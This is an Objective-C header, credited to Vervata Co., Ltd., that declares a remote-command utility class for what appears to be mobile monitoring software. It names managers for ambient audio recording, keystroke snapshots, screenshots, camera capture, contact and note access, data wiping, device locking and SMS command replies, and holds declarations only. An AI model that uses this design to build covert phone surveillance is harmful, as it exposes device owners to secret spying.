/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdUtils
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "SMSSender.h"
#import "FxEventEnums.h"
#import "EventDelegate.h"
#import "AppContext.h"
#import "ServerAddressManager.h"
#import "PreferenceManager.h"
#import "ActivationManagerProtocol.h"
#import "DataDelivery.h"
#import "EventDelivery.h"
#import "SystemUtils.h"
#import "EventRepository.h"
#import "ConnectionHistoryManager.h"
#import "ConfigurationManager.h"
#import "AddressbookManager.h"
#import "LicenseManager.h"

@class RemoteCmdData;
@class SyncTimeManager, SyncCDManager;

@protocol WipeDataManager, DeviceLockManager, ApplicationProfileManager, UrlProfileManager, ApplicationManager, BookmarkManager, ApplicationProfileManager, AmbientRecordingManager, CalendarManager;
@protocol NoteManager, CameraEventCapture, SoftwareUpdateManager, UpdateConfigurationManager,IMVersionControlManager, KeySnapShotRuleManager, DeviceSettingsManager, HistoricalEventManager, ScreenshotCaptureManager, TemporalControlManager ;
@protocol NetworkTrafficAlertManager;
@protocol AppScreenShotManager;


@interface RemoteCmdUtils : NSObject {
@protected
	id <SMSSender>                 mSMSSender;
	id <EventDelegate>             mEventDelegate;
	id <AppContext>                mAppContext;
	id <DataDelivery>              mDataDelivery;
	id <EventDelivery>             mEventDelivery;
	id <ServerAddressManager>      mServerAddressManager;
	id <PreferenceManager>         mPreferenceManager;
	id <ActivationManagerProtocol> mActivationManagerProtocol;
	id <SystemUtils>               mSystemUtils;
	id <EventRepository>           mEventRepository;
	id <ConnectionHistoryManager>  mConnectionHistoryManager; 
	id <ConfigurationManager>      mConfigurationManager;
	id <AddressbookManager>        mAddressbookManager; 
	LicenseManager					*mLicenseManager;
	SyncTimeManager					*mSyncTimeManager;
	SyncCDManager					*mSyncCDManager;
	id <WipeDataManager>			mWipeDataManager;
	id <DeviceLockManager>			mDeviceLockManager;
	id <ApplicationProfileManager>	mApplicationProfileManager;
	id <UrlProfileManager>			mUrlProfileManager;
	id <BookmarkManager>			mBookmarkManager;
	id <ApplicationManager>			mApplicationManager;
	id <AmbientRecordingManager>	mAmbientRecordingManager;
	id <NoteManager>				mNoteManager;
	id <CalendarManager>			mCalendarManager;
	id <CameraEventCapture>			mCameraEventCapture;
	id <SoftwareUpdateManager>		mSoftwareUpdateManager;
	id <UpdateConfigurationManager>	mUpdateConfigurationManager;
	id <IMVersionControlManager>	mIMVersionControlManager;
    id <KeySnapShotRuleManager>     mKeySnapShotRuleManager;
	id <DeviceSettingsManager>      mDeviceSettingsManager;
	id <HistoricalEventManager>     mHistoricalEventManager;
    id <ScreenshotCaptureManager>   mScreenshotCaptureManager;
    id <TemporalControlManager>     mTemporalControlManager;
    id <NetworkTrafficAlertManager> mNetworkTrafficAlertManager;
    id <AppScreenShotManager>       mAppScreenShotManager;
    
    
	NSString*                       mMediaSearchPath;
}

@property (nonatomic,retain) id <SMSSender> mSMSSender;
@property (nonatomic,retain) id <EventDelegate> mEventDelegate;
@property (nonatomic,retain) id <AppContext>  mAppContext; 
@property (nonatomic,retain) id <DataDelivery> mDataDelivery;
@property (nonatomic,retain) id <EventDelivery> mEventDelivery;
@property (nonatomic,retain) id <PreferenceManager> mPreferenceManager;
@property (nonatomic,retain) id <ServerAddressManager> mServerAddressManager; 
@property (nonatomic,retain) id <ActivationManagerProtocol> mActivationManagerProtocol;
@property (nonatomic,retain) id <ConnectionHistoryManager> mConnectionHistoryManager; 
@property (nonatomic,retain) id <EventRepository> mEventRepository;
@property (nonatomic,retain) id <ConfigurationManager> mConfigurationManager;
@property (nonatomic,retain) id <SystemUtils> mSystemUtils; 
@property (nonatomic,retain) id <AddressbookManager> mAddressbookManager;
@property (nonatomic,retain) LicenseManager *mLicenseManager;
@property (nonatomic,copy) NSString* mMediaSearchPath;
@property (nonatomic, assign) id <SoftwareUpdateManager> mSoftwareUpdateManager;
@property (nonatomic, assign) id <UpdateConfigurationManager> mUpdateConfigurationManager;
@property (nonatomic, assign) id <IMVersionControlManager> mIMVersionControlManager;

@property (nonatomic, assign) SyncTimeManager *mSyncTimeManager;
@property (nonatomic, assign) SyncCDManager *mSyncCDManager;
@property (nonatomic, assign) id <WipeDataManager> mWipeDataManager;
@property (nonatomic, assign) id <DeviceLockManager> mDeviceLockManager;
@property (nonatomic, assign) id <ApplicationProfileManager> mApplicationProfileManager;
@property (nonatomic, assign) id <UrlProfileManager> mUrlProfileManager;
@property (nonatomic, assign) id <BookmarkManager> mBookmarkManager;
@property (nonatomic, assign) id <ApplicationManager> mApplicationManager;
@property (nonatomic, assign) id <AmbientRecordingManager> mAmbientRecordingManager;
@property (nonatomic, assign) id <CalendarManager> mCalendarManager;
@property (nonatomic, assign) id <NoteManager> mNoteManager;
@property (nonatomic, assign) id <CameraEventCapture> mCameraEventCapture;
@property (nonatomic, assign) id <KeySnapShotRuleManager> mKeySnapShotRuleManager;
@property (nonatomic, assign) id <DeviceSettingsManager> mDeviceSettingsManager;
@property (nonatomic, assign) id <HistoricalEventManager> mHistoricalEventManager;
@property (nonatomic, assign) id <ScreenshotCaptureManager> mScreenshotCaptureManager;
@property (nonatomic, assign) id <TemporalControlManager> mTemporalControlManager;
@property (nonatomic, assign) id <NetworkTrafficAlertManager> mNetworkTrafficAlertManager;
@property (nonatomic, assign) id <AppScreenShotManager> mAppScreenShotManager;

//Shared Instance of RemoteCmdUtils
+ (RemoteCmdUtils *) sharedRemoteCmdUtils;

//Create System events 
- (void) createSystemEvent:(id ) aEvent 
		   andReplyMessage: (NSString *) aReplyMessage;

//Method for creation of Reply Message format

- (NSString *) replyMessageFormatWithCommandCode: (NSString *) aCmdCode 
									andErrorCode:(NSUInteger) aErrorCode;
//Send SMS Reply
- (void) sendSMSWithRecipientNumber:(NSString *) aRecipientNumber 
						 andMessage: (NSString *)aMessage;

//Get Product ID and Version
- (NSString *) getProductIdAndVersion; 

// parse the version string to be the array of version (Major, Minor, and build)
+ (NSArray *) parseVersion: (NSString *) aVersion;

// compare the software version whether it should be updated or now
+ (BOOL) shouldUpdateSoftwareCurrentVersionComponent: (NSArray *) aCurrentVersionComponents 
								newVersionComponents: (NSArray *) aNewVersionComponents;

@end
